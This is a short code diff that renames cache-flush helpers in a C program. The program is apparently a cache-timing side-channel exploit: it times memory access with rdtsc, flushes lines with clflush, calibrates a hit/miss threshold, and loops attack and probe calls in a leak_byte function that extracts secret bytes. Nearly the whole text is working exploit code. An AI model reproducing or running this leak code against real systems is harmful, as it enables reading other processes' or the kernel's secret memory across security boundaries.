@@ -39,7 +39,7 @@ static inline uint64_t rdtsc_end(void)
     return t;
 }
 
-static inline void flush_cache(const volatile void *addr)
+static inline void clflush(const volatile void *addr)
 {
     _mm_clflush((const void *)addr);
     _mm_mfence();
@@ -52,10 +52,10 @@ static inline uint64_t measure(volatile unsigned char *addr)
     return rdtsc_end() - start;
 }
 
-static void flush(void)
+static void flush_all(void)
 {
     for (unsigned i = 0; i < NUM_PAGES; ++i)
-        flush_cache(shared_mem + (size_t)i * PAGE_SIZE);
+        clflush(shared_mem + (size_t)i * PAGE_SIZE);
 }
 
 #define RUN_PYTHON_BUF_SIZE 1024
@@ -135,7 +135,7 @@ static uint64_t calibrate_threshold(void)
     for (unsigned i = 0; i < ATTEMPTS; ++i)
     {
         hit_total += measure(addr);
-        flush_cache(addr);
+        clflush(addr);
         miss_total += measure(addr);
     }
 
@@ -161,7 +161,7 @@ static unsigned char leak_byte(int fd, int target, uint64_t threshold)
         for (unsigned i = 0; i < ATTEMPTS; ++i)
         {
             // train step is optional...
-            flush();
+            flush_all();
             attack(fd, target);
             probe(scores, threshold);
         }
